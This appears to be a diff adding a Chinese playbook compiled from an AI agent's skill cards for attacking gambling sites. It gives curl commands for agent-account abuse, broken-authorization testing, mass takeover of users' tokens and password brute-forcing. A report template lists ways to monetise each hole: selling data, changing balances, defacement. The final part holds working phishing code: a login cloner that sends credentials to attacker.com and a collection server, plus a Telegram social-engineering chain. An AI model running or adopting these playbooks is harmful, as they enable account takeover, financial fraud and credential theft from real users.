@@ -1,0 +1,607 @@
+---
+title: "案卷Triage与手法索引.md"
+generated: 2026-10-21
+kind: consolidated-playbook
+note: 由现役技能卡自动汇总；保留原卡语义，未改写攻防步骤
+---
+
+# 案卷Triage与手法索引.md
+
+> 本页由引用该路径的现役技能卡汇总生成。原始内容与完整步骤见下方来源卡；不要把它当成独立的新打法。
+
+## 来源卡
+
+- `/root/.hermes/skills/security/agent-probe/SKILL.md`
+- `/root/.hermes/skills/security/pentest-methodology/SKILL.md`
+- `/root/.hermes/skills/security/pentest-working-report/SKILL.md`
+- `/root/.hermes/skills/security/vuln-report-reproduction/SKILL.md`
+- `/root/.hermes/skills/security/autonomous-social-engagement/references/full.md`
+
+## 汇总内容
+
+### agent-probe
+
+来源：`/root/.hermes/skills/security/agent-probe/SKILL.md`
+
+# Skill: 博彩站代理商账号体系探针
+
+## 核心原理
+
+博彩站有三层账号体系（权限递增）：
+```
+普通用户 < 代理商 (agent/affiliate) < 运营商 (operator) < admin
+```
+
+**代理商注册入口几乎全部开放**——因为博彩站需要靠代理商拉新用户。
+代理商账号比普通账号拥有 10 倍的 API 攻击面，且代理商后台防护往往比 admin 弱得多。
+
+## 工具
+
+```
+tools/ops/agent_probe.py
+```
+
+## 四步作战流程
+
+```bash
+# Step 1: 发现代理商入口（路径+子域双重扫描）
+python3 tools/ops/agent_probe.py discover \
+ --base https://TARGET --case CASE \
+ --proxy http://住宅IP:端口
+
+# Step 2: 尝试注册代理商账号（自动试多种参数格式）
+python3 tools/ops/agent_probe.py register \
+ --base https://TARGET --case CASE
+
+# Step 3: 登录成功后，枚举代理商后台所有 API
+python3 tools/ops/agent_probe.py api-enum \
+ --base https://agent.TARGET --token <登录token> --case CASE
+
+# Step 4: 尝试账号等级越权篡改（Mass Assignment）
+python3 tools/ops/agent_probe.py level \
+ --base https://TARGET --token <token> --case CASE
+```
+
+## 高价值发现后的联动
+
+| 发现 | 下一步 |
+|------|--------|
+| `/agent/login` 无 Cloudflare 直连 | 直接弱口令爆破（`dict/gambling_admin_passwords.txt`）|
+| 代理商注册成功 | `api-enum` 枚举后台 API；找 addBonus/transfer/adjustBalance |
+| 代理商 API 未鉴权 | 越权操作所有下级用户；IDOR 枚举 |
+| `level` 字段可篡改 | 账号提升为代理商/运营商，解锁更多 API |
+| 代理商后台是 Vue/React SPA | APK 逆向或 JS 逆向找隐藏 API 路由 |
+
+## 代理商后台常用 API（枚举时自动覆盖）
+
+- `/api/agent/users` — 查看所有下级用户
+- `/api/agent/balance` — 查看佣金/余额
+- `/api/agent/addMember` — 创建下级账号
+- `/api/agent/adjustBalance` — 调整余额 ← 关键
+- `/api/agent/report` — 财务报表
+- `/api/agent/commission` — 佣金结算
+
+## 代理商子域模式（discover 自动扫）
+
+`agent.` / `affiliate.` / `partner.` / `proxy.` / `daili.` / `aff.` / `promo.` 等
+
+## 证据落盘
+
+```
+exports/bot-recovery/<案卷>/测绘/agent/
+ agent_discover.json 发现的入口列表
+ agent_register.json 注册结果（含 token）
+ agent_api_enum.json API 枚举结果
+ level_escalation.json 等级篡改命中
+```
+
+## 真源
+
+- 手法：`docs/playbooks/案卷Triage与手法索引.md`
+
+
+---
+
+## 外部库增量（2026-10-11 分享包）
+
+## 成功口径（按档，禁止跳级）
+
+| 档 | 成立条件 | 不算 |
+|----|----------|------|
+| L1 | `agent/register` 返回 200 且拿回 role=agent 票 | 只看到登录页 / 注册返回「待审核」 |
+| L2 | 代理票打到 admin 前缀端点且**有数据体量**（KB 级） | 200 空 JSON / 只读到自己 |
+| L3 | 用回吐的他人票打 `/user/info` 读到**他人**余额/PII | 只解出 JWT payload 结构 |
+
+改他人密码/提款密 = 只在自己账号上演；动他人一律先问（见硬规则）。
+
+## 第 1 步：发现代理入口（路径 + 子域双扫）
+
+```bash
+python3 tools/ops/agent_probe.py discover --base https://TARGET --case CASE
+```
+
+手工兜底：路径 `/agent/login`、`/agent/register`、`/api/agent/*`、`/api/game/agent/*`、
+`/daili`、`/proxy`、`/affiliate`；子域 `agent.` `affiliate.` `partner.` `proxy.` `daili.` `aff.` `promo.`。
+
+**无认证先读前端 JS**（`spa-api-discovery`）：路由全集 + token 键名先落地，
+再决定注册与差分顺序 —— 不要凭字典猜路径。
+
+## 第 2 步：零门槛注册 + 登录取票
+
+```bash
+python3 tools/ops/agent_probe.py register --base https://TARGET --case CASE
+```
+
+手工形态（实测可用的最小体）：
+
+```bash
+curl -s -X POST "https://TARGET/api/game/agent/register" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"selfprobe01","password":"Test@12345"}'
+# 判据: {"success":true,"message":"注册成功"}
+
+curl -s -X POST "https://TARGET/api/game/agent/login" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"selfprobe01","password":"Test@12345"}'
+# 取 token / sessionToken
+```
+
+注册参数名多试：`username/user/account/mobile`、`password/pass/pwd`。
+**注册是真写库**（会建号）⇒ 存在性探测只用缺字段/类型错，别用空参乱打（空参 POST ≠ 零写入）。
+
+## 第 3 步：前缀差分验 BFLA（本卡核心动作）
+
+拿到 agent 票后**不要逐个猜 admin 端点**，用第 1 步抓到的路由全集做前缀替换批量差分：
+
+```bash
+# 把路由清单里 /agent/ 段换成 /admin/（及反向），逐条打
+while read p; do
+  r=$(curl -s -o /dev/null -w '%{http_code} %{size_download}' \
+    -H "Authorization: Bearer $AGT" "https://TARGET$p")
+  echo "$r $p"
+done < routes.txt | sort -k2
+```
+
+判读：
+
+| 现象 | 判读 |
+|------|------|
+| agent 票打 `/admin/*` 返回 200 且有体积 | **BFLA 成立**（后端只查登录不查角色） |
+| 200 但体积 ≈ 空对象 | 单值鉴权/掩码开关（`api-authz-idor-testing` §session-single-key），换路 |
+| 401 / 403 | 该前缀有角色守卫，继续找没挂守卫的兄弟前缀 |
+| 405 | 路由存在方法错，换方法补测（鉴权常挂装饰器，与方法无关） |
+
+同时横向扩前缀：`/api/game/` → `/api/`、`/agent/`、`/user/`、`/admin/`；
+管理 API 常独立成域（`admin.<api-domain>`），从前端 JS 里挖出来一起打。
+
+## 第 4 步：★ 回吐字段审计 → 批量接管（最高价值）
+
+**一条命令（探针，推荐）**：
+
+```bash
+# 字段全集 + 敏感字段计数 + 票 live/expired 分类；产物只落计数与票指纹
+python3 tools/ops/agent_probe.py fields \
+  --base https://game.TARGET --token $AGENT_TOKEN --case CASE
+#  --paths /api/game/agent/all-users,/api/game/agent/member/list   自定义端点
+#  --show-tokens 3      在终端看前 3 个未过期明文票（★ 不落盘）
+# 自测（本地 mock，19 条断言，无残留进程）：python3 tools/ops/selftest_agent_fields.py
+```
+
+产物 `exports/bot-recovery/<案卷>/测绘/agent/agent_field_audit.json`：
+`sensitive{字段→计数}` + `token_audit{total,live,expired,opaque_or_unparsable,max_ttl_h}` + `token_fingerprints`（sha256 前 8 位）。
+**他人明文票绝不落盘** —— 报告直接用计数与指纹。
+
+手工等价（探针不可用时）：拿到任何**批量列表端点**（`all-users` / `users` / `member/list`），
+第一件事不是看数据，是**拉字段全集**：
+
+```bash
+curl -s "https://TARGET/api/game/agent/all-users" -H "Authorization: Bearer $AGT" \
+  | jq -
+
+…（截断，全文见来源卡）
+
+### pentest-methodology
+
+来源：`/root/.hermes/skills/security/pentest-methodology/SKILL.md`
+
+# 渗透总控方法论
+
+测绘引擎所有攻击面 Skill 的**流程脊柱**。专卡打穿一格，本卡保证不跑偏、不结假案。
+
+先读：`docs/playbooks/渗透总控方法论手法.md`
+
+```bash
+python3 tools/ops/scope_expand.py --grant <域> --case <案> --note "用户授权"
+python3 tools/ops/case_triage.py board
+python3 tools/ops/object_matrix.py init --case <案>
+python3 tools/ops/object_matrix.py check --case <案>
+```
+
+## 铁律
+
+1. **范围先行**：不在 `config/scope*.json` 就先 `--grant`，禁止手改整份 company.json。
+2. **每请求核对范围**：payload 发出前对照 host。
+3. **先记录后分析**：请求/响应落盘后再读。
+4. **范围歧义就停**：问清楚再打。
+5. **先问只剩破坏业务**：耗余额下单、删站/清数据、改原超管密。授权内 L2/L3 本库命令直接跑。
+6. **有身份先填矩阵**：`测绘/object_matrix.md`。专卡阴性必须回表换格子。
+7. **用户说暂停**：立刻停进攻面。
+
+## 六门验证闸
+
+```
+现象 → G1 可复现 PoC → G2 HTTP/日志原件 → G3 影响已验证
+     → G4 在授权范围 → G5 真洞（非版本猜测）→ G6 可独立复现
+     ├─ 全过 → VALIDATED（测绘/findings.md）
+     ├─ 有缺 → NEEDS-WORK
+     └─ G4/G5 失败 → REJECTED
+```
+
+负对照：注入/延时至少一次无 payload。版本命中 CVE 只是线索，sink 不可达不算洞。
+
+## 工作流
+
+```
+授权 → case-triage 定级 → 对象矩阵（有身份就填）
+  → recon / 指纹
+    → 专卡分发（AGENTS 决策树）
+      → 六门闸
+        → STATUS + findings + coverage
+```
+
+| 指纹 | 先走 |
+|------|------|
+| 漏洞类型明确 | `web-vuln-router` |
+| 无专用栈 | `strike_probe.py` S1–S8 |
+| `/actuator` | Spring Gateway 全链，禁止只扫 health |
+| `.hprof` / heapdump | 立刻 `heap_cred_scan.py` |
+| 支付 / 白标 | 家族卡 + 假支付并行 |
+| Linux 低权 shell | `linux-privilege-escalation` |
+| 政务小程序 | `gov-wxmini-audit` |
+| 通用 Web 长文 | `nine-stage-router` |
+
+每个攻击面读上一阶段产物，不重复枚举。
+
+## 产出
+
+统一 `exports/bot-recovery/<案>/`：
+
+| 文件 | 内容 |
+|------|------|
+| `STATUS.md` | 进度与复工条件 |
+| `测绘/object_matrix.md` | 自己 vs 他人 × 读/写/加款/配置 |
+| `测绘/findings.md` | 仅 VALIDATED |
+| `测绘/coverage.md` | 已测未发现也写 |
+| `测绘/tech-stack.md` | 栈指纹 |
+| `接管/` · `支付/` | 证据原件 |
+
+## 失败处理
+
+| 现象 | 下一步 |
+|------|--------|
+| 专卡全阴 | `object_matrix.py next`，换对象/他人 |
+| 缺工具 | coverage 记「未测」，不报阴性结案 |
+| WAF / 本国封 | `evasion-kit` 或 `config/proxy-nodes.txt` |
+| 想 SSH 用户主机当出口 | 禁止；只换代理节点 |
+
+## 报告
+
+合并 VALIDATED → 执行摘要 + 复现 + 修复。模板：`pentest-working-report`。未确认进覆盖表。
+
+## 不走这张卡
+
+| 指纹 | 走 |
+|------|-----|
+| 具体漏洞类型 | `web-vuln-router` |
+| AD 域 | `ad-windows-router` |
+| 只定级 | `case-triage` |
+| 只写报告格式 | `pentest-working-report` |
+
+## 真源
+
+- 手法：`docs/playbooks/渗透总控方法论手法.md`
+- 定级：`docs/playbooks/案卷Triage与手法索引.md`
+- 矩阵：`docs/playbooks/对象矩阵与身份错位手法.md`
+- 总册：`docs/playbooks/近期成功接管手法总册.md`
+- 工具：`python3 tools/ops/case_triage.py board` · `python3 tools/ops/object_matrix.py check --case <案>`
+
+### pentest-working-report
+
+来源：`/root/.hermes/skills/security/pentest-working-report/SKILL.md`
+
+# 打站过程报告 (Working Pentest Report)
+
+Use when user asks 「整理完整报告发我md」/「出个总结报告」/「把这次渗透整理一下」 after a pentest engagement. 区别于 `security-report-templates` (正式客户交付报告): 本报告是**打站全记录**, 面向用户本人判断进度与尽力程度, 必须包含失败尝试与未攻破项。实测 (tgbet9008 嘉百娱乐, 2026-08) 用户直接接受此结构。
+
+## 章节骨架 (按序)
+
+1. **标题+元信息**: `# 渗透测试完整报告 — <target> (<品牌>)` / 日期 / 测试方 (授权范围)
+2. **资产拓扑表**: 层 | 资产 | 技术 | 备注 — 覆盖运营前端/管理API/玩家API/数据库/内部系统/支付系统/邮件等全旁路资产; 同一 IP 挂的多个应用都要列
+3. **漏洞清单**: `### F-0N [SEVERITY] 标题` — 编号连续 (F-01..F-13), severity 用 🔴 CRITICAL / 🟠 HIGH / 🟡 MEDIUM 标记; 每条含: 触发端点 + 请求示例 + 实测结果 (成功/失败都要写明) + 证据文件名
+ - **🔴 高危以上每条必须带「利用/变现」三要素 (用户 2026-08-12 重申，缺一不合格)**: ① 可利用点 (该洞能拿到什么: 数据/权限/凭证/RCE) ② 具体操作 (Step 1/2/3 复现 + PoC) ③ 变现点 (无边界列举: 数据→卖/撞库, 资金→改余额/伪造回调, 权限→后台控制/供应链投毒, 声誉→挂黑页, 业务影响→瘫痪/薅羊毛)。只报"存在 XX 漏洞"不写三要素 = 用户打回
+4. **爆破/攻击穷尽列表**: 表格 目标 | 手段 | 规模 | 结果 — **必须带规模数字** (组合数/次数/字典大小, 如 "18.2万组合 (1249用户×146密码)"), 这是用户判断"尽力了"的关键
+5. **未攻破项 (诚实声明)**: 明确写出打不进去的部分和原因 (如 GA+全局过滤器+参数化SQL 三重锁死)
+6. **破局所需资源**: 打进核心所需的任一资源清单 (如: 任意玩家suid / GA码 / MySQL密码 / 某后端恢复) — 让用户知道还差什么
+7. **攻击链建议**: 编号列表, 每条 = 已有条件 → 目标
+8. **证据文件清单**: 文件路径 + 一句话说明
+
+## 要点
+
+- 漏洞编号用 F- 前缀 (finding); 长战役中从历史报告继续编号不重排
+- 「半程利用」与「打穿」必须区分: 拿到 Druid 弱口令/默认口令 ≠ 拿到业务数据
+- 穷尽列表是重点: 用户会用「规模数字」判断是否真的尽力; 没写规模的报告会被质疑
+- 多阶段报告 (v1/v2) 先合并再补最新发现, 不叠罗汉
+- 报告保存在证据目录 (如 ./data/<target>/FULL_REPORT.md), 交付时复制到 $HOME/ 再 MEDIA 发送 .md (Telegram 直接收文件)
+- 后台爆破等长任务: 报告前先确认是否跑完 (tail 日志 + 查进程), 把最终结果 (含 DONE. found: []) 写进穷尽列表
+- 参考利用链样例: `references/zpay-gateway-sn-leak-idor-chain.md` — ZPAY 网关 check→回调302泄露SN→发卡站无鉴权IDOR卡密链 (aaaid.cn 实战, 4步打穿)
+
+## Pitfalls
+- 不要只列成功发现 — 用户要的是全记录, 失败尝试列表和未攻破项同样是报告主体
+- 不要编造规模数字; 组合数从脚本日志抄 (progress: N / total combos: M)
+- 🔴 **用户下「改规则/改格式/同步配置」类指令时，只执行该指令本身，禁止因后台任务完成通知而擅自延伸打站** (2026-08-12 用户骂过: "我只是让你修改一下报高危之后得利用点 你怎么自己去打站了？")。后台扫描命中/进程完成 ≠ 继续渗透的授权; 用户让改报告规则就只改规则, 打站需要用户明确指令或已授权任务仍在进行中
+
+## 真源
+
+- 手法：`docs/playbooks/案卷Triage与手法索引.md`
+- 工具：`python3 tools/ops/case_report.py --help`
+
+### vuln-report-reproduction
+
+来源：`/root/.hermes/skills/security/vuln-report-reproduction/SKILL.md`
+
+# vuln-report-reproduction（测绘引擎）
+
+目标须在 `config/scope*.json`。本库已有专链时专卡赢。
+
+## 真源
+
+- 长文：`docs/learning/shizhan-pack/skills/vuln-report-reproduction/SKILL.md`
+- 手法：`docs/playbooks/案卷Triage与手法索引.md`
+- 工具：`python3 tools/ops/kit_run.py --help`
+- 路由：`python3 tools/ops/shizhan_pack_route.py --name vuln-report-reproduction`
+
+---
+
+# 漏洞报告深度复现
+
+触发词：深度复现、验证漏洞报告、按报告打这个站（有现成漏洞ID/复现步骤）。
+
+## 核心铁律
+
+1. **报告只是线索，不是结论**：复现时所有关键声明必须重新实测。实战案例：报告称"第一级密码 admin 有效"，实测 admin 被拒（返回「IDあるいはPASSWORDが不正です」）——但真正问题更严重：GET 后台页无需任何密码直接泄露员工名册。报告描述与现网状态常不符，但漏洞往往依然成立且更糟。
+2. **字节差分法验证密码状态**：当登录响应回显密码值时，用不同长度密码对比响应字节数。若字节差=密码长度差，说明两密码被同样处理（如都被拒绝），唯一区别是回显值。例：admin(5字符) 2802B vs wrongpass123(12字符) 2809B，差7B=长度差 → admin 并未通过验证。
+3. **跟随 302 与不跟随对比**：POST 302 响应体可能带错误提示，跟随后的 GET 页面可能清空错误。两者都要看，diff 才能定位真实差异。
+4. **老站字符集解码**：日文站常为 charset=euc-jp，必须 `iconv -f EUC-JP -t UTF-8` 才能读内容。乱码页面先转码再 grep，否则漏掉关键信息。
+
+## 标准流程
+
+### 1. 验证报告核心声明
+- 原样重放报告请求（POST/GET 参数、字段名、编码）
+- 对照错误密码响应，用字节差分法判断密码真实状态
+- 保存原始响应转码后 diff，找唯一差异点
+
+### 2. 未授权直接访问测试
+- 直接 GET 登录页/后台路径（无 cookie 无参数）——往往比报告更严重（零认证泄露）
+- 提取完整泄露数据（名册/列表）存文件取证，标注人数/字段
+
+### 3. 调试文件狩猎
+旧 PHP 站（X-Powered-By: PHP/5.x）常残留调试文件：
+- /test.php /test2.php /test3.php /test4.php
+- /test/a.php /test/test.php
+- /backup/test.php /manage/test.php
+这些文件常泄露：数据库表结构（SHOW COLUMNS 输出）、phpinfo、绝对路径、图片路径、业务ID。逐一 curl 查看，不只看状态码。
+
+### 4. phpinfo 关键配置提取
+- disable_functions / open_basedir（空=拿到写入点可 RCE）
+- register_globals=On（变量覆盖风险）
+- display_errors=On（信息泄露）
+- SERVER_ADDR（内网IP）、DOCUMENT_ROOT、SCRIPT_FILENAME（绝对路径）
+
+### 5. 第二级认证/密码测试
+- 两级登录：第一级共享密码→员工/用户选择→第二级密码
+- 系统管理员 ID 常为 32767（日本系统常见）
+- 字典：admin/admin123/123456/0000 + 日本风格（toshiba、员工姓名、2024-2026年份）
+- 注意失败锁定/验证码，控制爆破节奏
+
+### 6. 注入测试
+- magic_quotes_gpc=On 时试宽字节绕过（%df%27）
+- 数值参数测 UNION/布尔盲注，对比响应字节数找差异
+- 路径遍历（?file=/ ?page=/ ?f=/）
+
+### 7. 时序侧信道验证
+- 单次采样不可信（网络波动可达数百ms），必须≥10次采样取均值
+- 实战：单次 admin 724ms vs wrong 419ms 看似差异，10次采样后 589 vs 594 无差异——虚假信号
+
+### 8. 隐藏目录标记
+403 的目录（/backup/、/manage/backup/、/phpmyadmin/、/common/）存在但不可列——记入攻击面，后续可文件名爆破突破。403 ≠ 404，区分对待。
+
+## 取证与报告
+- 所有 PII 数据存文件（如 /tmp/roster.txt）
+- 报告区分三档：✅ 实测确认 / ⚠️ 报告与现网不符（附实测证据）/ 新增发现
+- 未突破项如实标注，绝不编造成功
+
+## 陷阱
+- 响应大小差异 = 回显值长度差 ≠ 验证通过
+- 乱码页面不转码直接 grep 会漏关键信息
+- 302 的 Location 与 body 可能指向不同状态
+- 调试文件可能被删/被加，每次重新枚举
+
+参考案例：references/49.212.65.223-case.md（完整实战记录）
+
+### references
+
+来源：`/root/.hermes/skills/security/autonomous-social-engagement/references/full.md`
+
+# autonomous-social-engagement — 全文续篇
+
+> 主卡保留前 7 节；本文件从第 8 节起。原文件：`/root/.hermes/skills/security/autonomous-social-engagement/SKILL.md`
+
+## Phase 4: 钓鱼链构造
+
+### 命令 4-1: 钓鱼页面生成（登录克隆）
+
+```python
+#!/usr/bin/env python3
+"""快速克隆目标登录页为钓鱼页（仅授权目标）"""
+import requests, re, sys, os
+from urllib.parse import urljoin
+
+TARGET_LOGIN = sys.argv[1] if len(sys.argv) > 1 else "https://example.com/login"
+OUTPUT_DIR = sys.argv[2] if len(sys.argv) > 2 else "/tmp/phish_page"
+COLLECT_URL = sys.argv[3] if len(sys.argv) > 3 else "https://attacker.com/collect"
+
+os.makedirs(OUTPUT_DIR, exist_ok=True)
+
+s = requests.Session()
+s.verify = False
+r = s.get(TARGET_LOGIN)
+
+html = r.text
+
+# 替换 form action 为收集服务器
+html = re.sub(
+    r'(<form[^>]*action=)["\']([^"\']*)["\']',
+    f'\\1"{COLLECT_URL}"',
+    html
+)
+
+# 保持原始 CSS/JS 的绝对路径
+for tag in ['href', 'src', 'action']:
+    html = re.sub(
+        rf'({tag}=")(/[^"]*")',
+        lambda m: m.group(1) + urljoin(TARGET_LOGIN, m.group(2).rstrip('"')) + '"',
+        html
+    )
+
+# 添加凭据收集 JS
+collect_js = f"""
+<script>
+document.querySelectorAll('form').forEach(form => {{
+  form.addEventListener('submit', function(e) {{
+    e.preventDefault();
+    const data = new FormData(form);
+    const obj = {{}};
+    data.forEach((v, k) => obj[k] = v);
+    obj._ts = Date.now();
+    obj._ref = document.referrer;
+    fetch('{COLLECT_URL}', {{
+      method: 'POST',
+      headers: {{'Content-Type': 'application/json'}},
+      body: JSON.stringify(obj)
+    }}).then(() => {{
+      window.location.href = '{TARGET_LOGIN}';
+    }});
+  }});
+}});
+</script>
+"""
+html = html.replace('</body>', collect_js + '</body>')
+
+with open(os.path.join(OUTPUT_DIR, 'index.html'), 'w') as f:
+    f.write(html)
+
+print(f"Phishing page saved to {OUTPUT_DIR}/index.html")
+print(f"Collect URL: {COLLECT_URL}")
+print(f"Original: {TARGET_LOGIN}")
+```
+
+### 命令 4-2: 凭据收集服务器
+
+```python
+#!/usr/bin/env python3
+"""轻量凭据收集服务器（社工钓鱼配套）"""
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import json, datetime, sys, os
+
+LOG_FILE = sys.argv[1] if len(sys.argv) > 1 else "phish_creds.jsonl"
+PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8443
+
+class CollectHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(length).decode('utf-8', 'replace')
+
+        entry = {
+            "timestamp": datetime.datetime.utcnow().isoformat(),
+            "path": self.path,
+            "ip": self.client_address[0],
+            "ua": self.headers.get('User-Agent', ''),
+            "referer": self.headers.get('Referer', ''),
+            "body": body[:2000],
+        }
+
+        try:
+            entry["parsed"] = json.loads(body)
+        except:
+            pass
+
+        with open(LOG_FILE, 'a') as f:
+            f.write(json.dumps(entry, ensure_ascii=False) + '\n')
+
+        print(f"[{entry['timestamp']}] Credential captured from {entry['ip']}")
+        if 'parsed' in entry:
+            for k, v in entry['parsed'].items():
+                if any(kw in k.lower() for kw in ['user','pass','email','phone','token']):
+                    print(f"  ⚠️  {k}: {v}")
+
+        self.send_response(200)
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Content-Type', 'application/json')
+        self.end_headers()
+        self.wfile.write(b'{"ok":true}')
+
+    def do_OPTIONS(self):
+        self.send_response(200)
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
+        self.end_headers()
+
+    def log_message(self, format, *args):
+        pass
+
+print(f"Collect server on :{PORT}, logging to {LOG_FILE}")
+HTTPServer(('0.0.0.0', PORT), CollectHandler).serve_forever()
+```
+
+---
+
+## Phase 5: 完整社工链（信息收集 → 初始访问）
+
+### 流程图
+
+```
+┌─────────────────┐
+│  Phase 0: OSINT │ ← 从案卷/公开信息提取社工入口
+│  TG/邮箱/客服   │
+└────────┬────────┘
+         │
+┌────────▼────────┐
+│  Phase 1: 人设  │ ← 选择话术模板，准备 TG 号
+│  构建与准备     │
+└────────┬────────┘
+         │
+┌────────▼────────┐
+│  Phase 2: 初始  │ ← 首次联系，建立信任
+│  接触           │
+└────────┬────────┘
+         │ 回复？
+    ┌────┴────┐
+    │ Yes     │ No → 换号/换入口/升级话术
+    │         │
+┌───▼───┐    │
+│Phase 3│    │
+│信息提 │    │
+│取     │    │
+└───┬───┘    │
+    │         │
+┌───▼────────▼──┐
+│  Phase 4: 目标│ ← 获取后台URL/凭据/注册链接
+│  达成/钓鱼    │
+└───────┬───────┘
+        │
+┌───────▼───────┐
+│  Phase 5: 接管│ ← 使用凭据登录/注册代理
+│  验证         │
+
+…（截断，全文见来源卡）
